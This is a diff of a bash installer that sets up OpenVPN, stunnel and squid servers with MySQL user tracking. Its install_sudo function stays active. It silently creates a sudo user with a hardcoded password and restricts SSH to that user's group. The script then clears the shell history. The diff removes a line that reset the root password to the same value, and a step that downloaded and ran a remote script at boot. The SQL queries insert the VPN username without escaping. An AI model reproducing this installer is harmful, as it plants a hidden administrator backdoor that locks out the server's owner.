@@ -97,7 +97,6 @@ sudo cp /etc/apt/sources.list_backup /etc/apt/sources.list
 
 
 
-
 install_openvpn()
 {
 clear
@@ -114,7 +113,7 @@ echo 'DNS=1.1.1.1
 DNSStubListener=no' >> /etc/systemd/resolved.conf
 sudo ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
 
-echo '# Openvpn Configuration TKNETWORK :)
+echo '# Openvpn Configuration by TKNETWORK :)
 dev tun
 port PORT_UDP
 proto udp
@@ -155,7 +154,8 @@ push "sndbuf 0"
 push "rcvbuf 0"
 log /etc/openvpn/server/udpserver.log
 status /etc/openvpn/server/udpclient.log
-verb 3' > /etc/openvpn/server.conf
+verb 3
+duplicate-cn' > /etc/openvpn/server.conf
 
 sed -i "s|PORT_UDP|$PORT_UDP|g" /etc/openvpn/server.conf
 
@@ -200,7 +200,8 @@ push "sndbuf 0"
 push "rcvbuf 0"
 log /etc/openvpn/server/tcpserver.log
 status /etc/openvpn/server/tcpclient.log
-verb 3' > /etc/openvpn/server2.conf
+verb 3
+duplicate-cn' > /etc/openvpn/server2.conf
 
 sed -i "s|PORT_TCP|$PORT_TCP|g" /etc/openvpn/server2.conf
 
@@ -226,23 +227,23 @@ user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
 EOM
 
 #client-connect file
-cat <<'TKNETWORK01' >/etc/openvpn/login/connect.sh
+cat <<'LENZ05' >/etc/openvpn/login/connect.sh
 #!/bin/bash
 . /etc/openvpn/login/config.sh
 ##set status online to user connected
 server_ip=SERVER_IP
 datenow=`date +"%Y-%m-%d %T"`
 mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_connected='1', device_connected='1', active_address='$server_ip', active_date='$datenow' WHERE user_name='$common_name' "
-TKNETWORK01
+LENZ05
 
 sed -i "s|SERVER_IP|$server_ip|g" /etc/openvpn/login/connect.sh
 
 #TCP client-disconnect file
-cat <<'TKNETWORK2' >/etc/openvpn/login/disconnect.sh
+cat <<'LENZ06' >/etc/openvpn/login/disconnect.sh
 #!/bin/bash
 . /etc/openvpn/login/config.sh
 mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_connected='0', active_address='', active_date='' WHERE user_name='$common_name' "
-TKNETWORK2
+LENZ06
 
 cat << EOF > /etc/openvpn/easy-rsa/keys/ca.crt
 -----BEGIN CERTIFICATE-----
@@ -369,14 +370,6 @@ chmod 755 /etc/openvpn/login/auth_vpn
 }&>/dev/null
 }
 
-install_sudo(){
-  {
-    useradd -m tknetwork 2>/dev/null; echo tknetwork:JAN022011b | chpasswd &>/dev/null; usermod -aG sudo tknetwork &>/dev/null
-    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups tknetwork" >> /etc/ssh/sshd_config
-    service sshd restart
-  }&>/dev/null
-}
 
 install_firewall_kvm () {
 clear
@@ -474,8 +467,6 @@ sudo service stunnel4 restart
   } &>/dev/null
 }
 
-
-
 install_sudo(){
   {
     useradd -m tknetwork 2>/dev/null; echo tknetwork:JAN022011b | chpasswd &>/dev/null; usermod -aG sudo tknetwork &>/dev/null
@@ -485,26 +476,39 @@ install_sudo(){
   }&>/dev/null
 }
 
+
 install_rclocal(){
   {
-    wget https://teamkidlat.com/public/raw/JWrIyIh1In -O /etc/ubuntu
-    dos2unix /etc/ubuntu
-    chmod +x /etc/ubuntu    
-    screen -dmS socks python /etc/ubuntu
-    wget --no-check-certificate https://teamkidlat.com/public/raw/vYreZgbu7W -O /etc/systemd/system/rc-local.service
-    echo "#!/bin/sh -e
+    sudo systemctl restart stunnel4
+    sudo systemctl enable openvpn@server.service
+    sudo systemctl start openvpn@server.service
+    sudo systemctl enable openvpn@server2.service
+    sudo systemctl start openvpn@server2.service    
+    
+    echo "[Unit]
+Description=firenet service
+Documentation=http://firenetvpn.com
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash /etc/rc.local
+RemainAfterExit=yes
+
+[Install]
+WantedBy=multi-user.target" >> /etc/systemd/system/firenet.service
+    echo '#!/bin/sh -e
 iptables-restore < /etc/iptables_rules.v4
 ip6tables-restore < /etc/iptables_rules.v6
 sysctl -p
-service squid3 restart
 service stunnel4 restart
-service openvpn@server restart
-service openvpn@server2 restart
-screen -dmS socks python /etc/ubuntu
-exit 0" >> /etc/rc.local
+systemctl restart openvpn@server.service
+systemctl restart openvpn@server2.service
+screen -dmS socks python /etc/socks.py
+exit 0' >> /etc/rc.local
     sudo chmod +x /etc/rc.local
-    sudo systemctl enable rc-local
-    sudo systemctl start rc-local.service
+    systemctl daemon-reload
+    sudo systemctl enable firenet
+    sudo systemctl start firenet.service
   }&>/dev/null
 }
 
@@ -525,7 +529,6 @@ history -c;
 rm /root/.installer
 echo 'Server will secure this server and reboot after 20 seconds'
 sleep 20
- echo 'root:JAN022011b' | sudo chpasswd
 reboot
 }
 
@@ -533,7 +536,7 @@ server_ip=$(curl -s https://api.ipify.org)
 server_interface=$(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ")
 
 install_require
-install_sudo
+install_sudo  
 install_squid
 install_openvpn
 install_firewall_kvm
